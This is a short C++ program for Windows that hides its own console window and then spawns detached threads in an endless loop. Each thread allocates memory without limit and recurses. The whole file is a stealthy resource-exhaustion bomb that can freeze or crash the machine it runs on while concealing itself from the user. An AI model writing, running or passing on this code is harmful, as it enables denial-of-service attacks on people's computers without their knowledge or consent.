#include <bits/stdc++.h>
#include <windows.h>
// #include <dir.h>
#include <conio.h>
#include <sys/stat.h>
#include <shlwapi.h>
#include <thread>
#include <dirent.h>
#include <vector>
#include <cstring>
#pragma comment(lib, "Shlwapi.lib")
using namespace std;
inline bool exists(const string name)
{
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}
WINBOOL HideConsole()
{
    HWND hwndc = GetConsoleWindow();
    return ShowWindow(hwndc, SW_HIDE);
}
void w()
{
    long long i = 1;
    vector<long long> v;
    while (++i)
    {
        v.push_back(i);
    }
    w();
}
int main()
{
    HideConsole();
    while (1)
    {
        thread s(w);
        s.detach();
    }
    return 0;
}